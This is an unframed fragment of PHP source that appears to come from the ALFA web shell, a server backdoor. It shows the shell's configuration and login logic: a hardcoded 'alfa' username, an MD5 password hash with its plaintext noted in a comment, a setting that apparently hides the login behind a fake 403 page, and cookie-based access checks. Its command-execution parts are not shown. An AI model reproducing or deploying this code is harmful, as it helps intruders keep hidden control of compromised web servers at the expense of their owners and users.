...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'df65e4ee1c202d90f0b5fd36b839754b',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && md5($_COOKIE["AlfaPass"]) != $config['AlfaPass']){
if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", $_POST["password"]);
...
if(@md5($_COOKIE["AlfaPass"]) != $config['AlfaPass']){
